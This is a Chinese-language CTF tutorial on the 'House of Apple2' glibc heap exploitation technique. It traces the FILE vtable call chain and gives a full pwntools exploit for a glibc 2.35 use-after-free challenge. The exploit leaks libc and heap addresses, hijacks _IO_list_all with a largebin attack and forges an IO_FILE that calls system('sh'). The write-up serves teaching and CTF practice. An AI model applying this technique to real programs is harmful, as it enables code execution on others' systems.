# house of apple2入门系列-先知社区

> **来源**: https://xz.aliyun.com/news/17203  
> **文章ID**: 17203

---

随着高版本libc的到来，去除了hook，apple2的使用也越来越频繁。

# 调试指令

把调试指令放到前面，方便新手复制粘贴

```
pwndbg> p/x *(struct _IO_FILE_plus *)_IO_list_all
pwndbg> p *_IO_list_all
```

```
pwndbg> p _IO_wide_data_2
```

```
pwndbg> p _IO_list_all.file._wide_data._wide_vtable
$4 = (const struct _IO_jump_t *) 0x7ffff7e170c0 <_IO_wfile_jumps>
pwndbg> p *(const struct _IO_jump_t *) 0x7ffff7e170c0
```

# 原理

## 原理概述

使用 largebin attack 可以劫持 `_IO_list_all` 变量，将其替换为伪造的 `IO_FILE` 结构体，而在此时，我们其实仍可以继续利用某些IO流函数去修改其他地方的值

`stdin/stdout/stderr` 这三个 `_IO_FILE` 结构体会以 `_IO_file_jumps` 为虚表，而其中的函数 `IO_validate_vtable` 负责检查 `vtable` 的合法性

但在调用虚表 `_wide_vtable` 里面的函数时，并没有检查 `vtable` 的合法性

因此，我们可以劫持 `IO_FILE` 的 `vtable` 为 `_IO_wfile_jumps`，控制 `_wide_data` 为可控的堆地址空间，进而控制 `_wide_data->_wide_vtable` 为可控的堆地址空间，然后控制程序的执行流

## 调用链

![image-20240904211653049.png](images/c655e7c0-63c0-31ff-8e81-44f601ebea24)

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240904211653049.png)

序从main返回或者执行exit后会遍历`_IO_list_all`存放的每一个`IO_FILE`结构体，如果满足条件的话，会调用每个结构体中`vtable->_overflow`函数指针指向的函数。

但是glibc2.24之后增加了对 `vtable` 合法性的检测的 `IO_validate_vtable` 函数，所以一些高版本的 IO 攻击方法都需要利用各种手法来绕过vtable检测。

但是 `_wide_data` 这个成员很特殊，这个成员结构体中的 `_wide_vtable`和调用vtable里函数指针一样，在调用 `_wide_vtable` 虚表里面的函数时，也同样是使用宏去调用，**但其没有关于vtable的合法性检查**。

所以我们可以针对`_wide_data` 对exit的调用链进行一些操作。

## \_IO\_flush\_all\_lockp

从\_IO\_flush\_all\_lockp开始吧

```
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;
#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)/*一些检查，需要绕过*/
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))/*也可以绕过这个*/
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/
```

我们的目的是要执行\_IO\_OVERFLOW，那么满足上面的一些条件即可

**条件1：fp->\_mode <= 0 && fp->\_IO\_write\_ptr > fp->\_IO\_write\_base**

IO\_OVERFLOW会通过宏展开，最后会执行函数IO\_wfile\_overflow，但是执行该函数有一个前提，就是fp->vtable要指向IO\_wfile\_jumps。(原先指向的是\_IO\_file\_jumps)  
**条件2：fp->vtable = IO\_wfile\_jumps**

## \_IO\_wfile\_overflow

接下来到\_IO\_wfile\_overflow

```
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
    {
      _IO_wdoallocbuf (f);//执行目标
      // ......
    }
    }
}
```

我们的目的是要执行\_IO\_wdoallocbuf

**条件3：f->\_flags & \_IO\_CURRENTLY\_PUTTING) == 0**

​ **f->wide\_data->\_IO\_write\_base == 0**

## \_IO\_wdoallocbuf

接下来就到\_IO\_wdoallocbuf了

```
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)//
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
             fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```

最后会执行\_IO\_WDOALLOCATE这个宏定义，并以io\_file结构体地址为参数，准确来说这个宏定义展开之后是一个函数指针，所以最终目的就是把这个函数指针劫持为system函数。

而这个”函数指针“在哪呢？ fp->wide\_data->\_wide\_vtable->\_\_doallocate

把\_\_doallocate改成system就好了。

**条件4：fp->wide\_data->\_wide\_vtable->\_\_doallocate = system**

​ **fp->\_flags = sh**

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905143002114.png)![image-20240905151718400.png](images/14a4863c-9f8b-3c1b-974e-ef90d1ee413b)

至此，所有要劫持的都结束了，这样程序就会从exit一路执行到system。

## 利用条件

1. 程序从`main`函数返回或能调用`exit`函数
2. 能泄露出`heap`地址和`libc`地址
3. 能使用**一次**`largebin attack`

# 利用过程

结合例题2024litctf 2.35 pwn题去讲解

## 保护

```
$ checksec heap
[*] '/home/gsnb/Desktop/game/litctf/2.35/heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/home/gsnb/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64'
```

保护全开，![](file:///C:\Users\DELL\AppData\Local\Temp\QQ_1741591026125.png)程序漏洞只有uaf

![QQ_1741591026125.png](images/76ec25e3-a239-3b19-b230-2f7482103311)

## 泄露libc基址

```
add(8, 0x18)
add(0, 0x510)
add(1, 0x30)  # 0x20的话chunk2的地址是00结尾，printf没法泄露，所以要0x30
add(2, 0x520)
add(3, 0x30)
delete(2)
dbg()
add(4, 0x530)
show(2)
large = u64(r.recv(6).ljust(8, b'\0'))  # 其实是main_arena+0x490
libcbase = large - 0x670 - libc.sym['_IO_2_1_stdin_']
success('libcbase: ' + hex(libcbase))
```

先申请两个大小属于largebin的chunk（chunk0，2），和一些用于防止合并的小chunk（chunk1，3），chunk8另作他用。

将chunk2free掉，进入unsortedbin中，再申请一个比它大的chunk，进入largebin

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905103703958.png)![image-20240905103703958.png](images/ab5a501e-ec6a-3820-bc27-d08cc3a98305)

由于存在uaf，此时便直接可以show泄露出libc。

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905104141351.png)![image-20240905104141351.png](images/30374368-0ce4-375b-a060-1f2d4026ba67)

## 泄露heap地址

```
edit(2, b'A' * 0x10)
show(2)
r.recv(0x10)
heap = u64(r.recv(6).ljust(8, b'\0'))
success('heap: ' + hex(heap))
```

![](file://C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905103703958.png?lastModify=1725504114)![image-20240905103703958.png](images/8e1cbcce-529e-3860-9f96-aefd6eb5b849)

再看这张图，可以看到fd\_nextsize存放的便是chunk2的地址，我们把fd和bk覆盖掉，便可以show泄露出heap地址

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905104608681.png)![image-20240905104608681.png](images/87815987-66d1-37e3-821e-38cfdc8e0537)

## largebin\_attack劫持io\_list\_all

```
delete(0)

edit(2, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - 0x20))

add(5, 0x550)
```

把另一个大小属于largebin的堆块free进unsortedbin，然后edit chunk2（此时fd和bk还是被覆盖成A的状态），把它改成largebin\_chunk的状态，并把bk\_nextsize改成\_IO\_list\_all - 0x20的位置

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905105922864.png)![image-20240905105922864.png](images/53cd10e8-4a59-3712-be02-17bc27370501)

然后再把chunk2搞进largebin，看看此时largebin的情况

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905111612141.png)![image-20240905111612141.png](images/03b9dc87-80ad-3f8f-95fe-e946b66d779a)

是不是没看出什么问题，那我们再看看io\_list\_all里面的情况，可以看到io\_list\_all\_chunk的fd\_nextsize位已经指向了chunk0

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905111555923.png)![image-20240905111555923.png](images/727727da-302e-307b-a7d2-d7028018ca4e)

所以就造成了一个把io\_list\_all劫持到chunk0的这么一个结果

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905111944664.png)![image-20240905111944664.png](images/b326414e-a07f-3861-9532-67f023b5d7d2)

这就是我们largebin\_attack的目的。

## 布置chunk0

这里为什么说是布置chunk0而不是布置io\_list\_all呢？ 因为我们要在chunk0这个大小为0x520的chunk里，不仅布置io\_list\_all的内容，还要布置fp->io\_wide\_data和fp->io\_wide\_data->wide\_vtable的内容。所以整个chunk0内容的布置是非常巧妙的。

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905113648831.png)![image-20240905113648831.png](images/d1d82989-c85b-3fd5-9b63-a273388e5ebd)

可以看到，劫持io\_list\_all到chunk0后，io\_list\_all里面的一些变量已经变成chunk0里面的内容了，但是如果\_flags变量需要修改怎么办？这时我们事先add的chunk8就排上了用场。

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905114003605.png)![image-20240905114003605.png](images/d6103d35-3e70-3b28-96aa-b532a35eefa6)

上面讲调用链的时候我们提到，\_\_doallocate会以io\_file里面的变量为参数，那我们把\_flags改成binsh就好了，同时flags还要满足f->\_flags & \_IO\_CURRENTLY\_PUTTING) == 0的条件。所以chunk8我们这样布置。

```
edit(8, b'A' * 0x10 + p32(0xfffff7f5) + b';sh\x00')
```

![image-20240905143736565.png](images/fdbb021c-0d1e-3da0-8105-d3fb49435012)

![image-20240905143907423.png](images/6f574359-0365-35ee-9f1f-f1114e45e6eb)

然后我们根据上面的四个条件布置chunk0

先上exp，再根据条件逐个解释

```
chunk_addr = heap - 0x560  # chunk0的chunk地址     add(0, 0x510)


fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(chunk_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b'\0') + p64(chunk_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b'\0') + p64(0)*13 + p64(system)

edit(0, fake_io_file)
```

#### 条件1：fp->\_mode <= 0 && fp->\_IO\_write\_ptr > fp->\_IO\_write\_base

我们看一下这些变量在io\_list\_all中的偏移

```
pwndbg> p *_IO_list_all
$4 = {
  file = {
    _flags = -2059,
    _IO_read_ptr = 0x521 <error: Cannot access memory at address 0x521>,
    _IO_read_end = 0x7cc0c5e1b110 <main_arena+1168> "",
    _IO_read_base = 0x5aca37ac2810 "",
    _IO_write_base = 0x5aca37ac2810 "",
    _IO_write_ptr = 0x7cc0c5e1b660 <_nl_global_locale+224> "¡\335\305\300|",
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x0,
    _offset = 0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x0
}
```

mode改成-1

```
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
```

IO\_write\_ptr >小于\_IO\_write\_base，一个1一个2好了

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905145041763.png)![image-20240905145041763.png](images/ef39b053-d5df-3b7b-936c-f0e94a8f437e)

#### 条件2：fp->vtable = IO\_wfile\_jumps

vtable在io\_list\_all里面的偏移为0xd8

```
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable
```

看一下改好\_IO\_list\_all之后的效果。

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905151246628.png)![image-20240905151246628.png](images/e352ae1f-5f74-3859-8355-6a888b3f7e97)

#### 条件3：f->\_flags & \_IO\_CURRENTLY\_PUTTING) == 0 f->wide\_data->\_IO\_write\_base == 0

\_flags变量我们已经在chunk8里面修改了，接着还要把fp->wide\_data劫持到chunk0里面一个我们可控的区域。

```
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(chunk_addr + 0x100)  # _wide_data
```

chunk\_addr + 0x100的位置就不错，填充偏移的时候都用0就能满足IO\_write\_base == 0了

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905151507415.png)![image-20240905151507415.png](images/c997783e-850a-33d0-9c28-672e38a7b9a0)

#### 条件4：fp->wide\_data->\_wide\_vtable->\_\_doallocate = system fp->\_flags = sh

要把fp->wide\_data->\_wide\_vtable劫持成chunk0里面一个我们可控的区域。

```
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b'\0') + p64(chunk_addr + 0x200)    
```

chunk\_addr + 0x200的位置就不错，0xe0为\_wide\_vtable在\_wide\_data里面的偏移。

```
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b'\0') + p64(0)*13 + p64(system)
```

把\_\_doallocate 覆盖成system，其余\_wide\_vtable里面的变量覆盖成0就好了。

![](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240905151718400.png)![image-20240905151718400.png](images/fbe33bd4-269a-3a1e-8069-6ea85d751c91)

## getshell

```

exit()


```

最后执行exit就能一路执行到system，然后getshell了。

## exp

```
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = process('./heap')
# r = remote('8.147.131.163',24252)
e = ELF('./heap')
libc = ELF('./libc-2.35.so')  # 打本地

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r,'b *$rebase(0x17ed)')
    pause()

def cmd(choice):
    r.recvuntil(b'>>')
    r.sendline(str(choice).encode())


def add(idx, size):
    cmd(1)
    r.recvuntil(b'idx? ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'size? ')
    r.sendline(str(size).encode())


def delete(idx):
    cmd(2)
    r.recvuntil(b'idx? ')
    r.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    r.recvuntil(b'idx? ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'content : ')


def edit(idx, content=b'deafbeef'):
    cmd(4)
    r.recvuntil(b'idx? ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'content : ')
    r.send(content)


def exit():
    cmd(5)


add(8, 0x18)
add(0, 0x510)
add(1, 0x30)  # 0x20的话chunk2的地址是00结尾，printf没法泄露，所以要0x30
add(2, 0x520)
add(3, 0x30)
delete(2)
dbg()
add(4, 0x530)
show(2)
large = u64(r.recv(6).ljust(8, b'\0'))  # 其实是main_arena+0x490
libcbase = large - 0x670 - libc.sym['_IO_2_1_stdin_']
_IO_list_all = libcbase + libc.sym['_IO_list_all']
io_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
system = libcbase + libc.sym['system']

success('libcbase: ' + hex(libcbase))

edit(2, b'A' * 0x10)
# pause()
show(2)
r.recv(0x10)
heap = u64(r.recv(6).ljust(8, b'\0'))
success('heap: ' + hex(heap))

delete(0)

edit(2, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - 0x20))

add(5, 0x550)
#dbg()
chunk_addr = heap - 0x560  # chunk0的chunk地址     add(0, 0x510)
edit(8, b'A' * 0x10 + p32(0xfffff7f5) + b';sh\x00')
 
fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(chunk_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b'\0') + p64(chunk_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b'\0') + p64(0)*13 + p64(system)

edit(0, fake_io_file)
# dbg()
exit()

r.interactive()
```

#
